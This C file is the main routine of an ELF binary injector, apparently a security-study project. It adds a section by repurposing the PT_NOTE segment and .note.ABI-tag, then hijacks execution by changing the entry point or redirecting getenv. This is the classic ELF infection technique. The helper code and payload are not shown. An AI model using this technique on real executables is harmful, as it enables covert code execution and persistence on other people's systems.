#include "binjecter.h"

struct arguments arguments;
Elf64_Ehdr* exec_header;

int main(int argc, char* argv[]) {
    exec_header = NULL;
    parse_all(argc, argv, &arguments);

    //check if elf file is executable and 64 bits and such
    bfd* pbfd = open_elf_bfd();
    bfd_close(pbfd);

    char* old_name = ".note.ABI-tag";

    //adds the section
    int pt_note = find_pt_note();
    sh_info sh_infos = add_section();
    overwrite_sh(old_name, sh_infos);
    reorder_sections();
    change_section_name(old_name, arguments.section_name);
    overwrite_ph_header(pt_note, sh_infos.size, sh_infos.offset);

    //exploit!
    if (arguments.change_entry_function == 1) {
        change_entrypoint();
    } else {
        size_t fun_ndx = find_func_in_dynsym("getenv");
        replace_func_address(fun_ndx);
    }

    if (exec_header != NULL) {
        free(exec_header);
    }

    return 0;
}
